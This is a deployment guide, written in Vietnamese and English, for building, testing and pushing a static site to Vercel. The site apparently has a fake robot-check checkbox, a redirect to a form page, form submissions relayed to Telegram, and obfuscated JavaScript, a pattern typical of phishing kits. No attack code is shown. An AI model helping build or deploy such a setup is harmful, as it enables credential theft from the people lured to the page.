# 🧪 Test Deploy Workflow

## Bước 1: Test Build Local

```bash
# Clean old build
npm run clean
# hoặc
rmdir /s /q dist

# Build new
npm run build
# hoặc
build.bat
```

### ✅ Kiểm tra dist/ folder:

```
dist/
├── index.html          ✓ Có
├── required.html       ✓ Có
├── build-info.json     ✓ Có
└── public/
    ├── js/
    │   ├── config.js   ✓ Có (obfuscated)
    │   ├── utils.js    ✓ Có (obfuscated)
    │   ├── modal.js    ✓ Có (obfuscated)
    │   └── app.js      ✓ Có (obfuscated)
    ├── styles/         ✓ Có
    ├── meta/           ✓ Có
    └── *.png, *.svg    ✓ Có
```

## Bước 2: Test trong dist/ local

```bash
# Open in browser
dist/index.html
```

### ✅ Test checklist:

- [ ] index.html loads
- [ ] Checkbox animation works
- [ ] Click checkbox → redirect to required.html
- [ ] required.html loads
- [ ] Modal opens
- [ ] Form submit works
- [ ] Telegram notification received

## Bước 3: Deploy lên Vercel

### Option A: CLI

```bash
vercel --prod
```

### Option B: Git Push

```bash
git add .
git commit -m "Deploy"
git push
```

## Bước 4: Test trên Vercel

```
https://your-project.vercel.app          → index.html ✓
https://your-project.vercel.app/robot    → index.html ✓
https://your-project.vercel.app/required → required.html ✓
```

### ✅ Test checklist online:

- [ ] Root URL loads index.html
- [ ] /robot loads index.html
- [ ] /required loads required.html
- [ ] No 404 errors
- [ ] JS files load (check DevTools Network tab)
- [ ] CSS files load
- [ ] Images load
- [ ] Form functionality works
- [ ] Telegram sends successfully

## 🐛 Troubleshooting

### Build fails locally

```bash
# Check dependencies
npm install

# Try manual build steps
node build.js
```

### 404 on Vercel

```bash
# Check vercel.json config
cat vercel.json

# Check build output
vercel logs

# Verify dist/ structure
ls -R dist/
```

### JS/CSS not loading

```bash
# Check browser console (F12)
# Verify paths in HTML:
#   - ./public/js/config.js
#   - ./public/styles/checkbox.css

# Check Vercel deployment files
vercel ls
```

### Vercel build fails

```bash
# Check build command in vercel.json:
"buildCommand": "npm run build"

# Check package.json has:
"scripts": {
  "build": "node build.js --obfuscate"
}

# Check dependencies are in "dependencies" not "devDependencies"
```

## 📝 Complete Workflow

```
1. Edit code → public/js/*.js
2. Run build → npm run build
3. Test local → dist/index.html
4. Deploy → vercel --prod
5. Test online → https://your-project.vercel.app
```

## ✨ Quick Deploy Script

Create `deploy.bat`:

```batch
@echo off
echo Building...
call npm run build

echo Deploying...
call vercel --prod

echo Done!
pause
```

Run: `deploy.bat`

---

Happy testing! 🚀

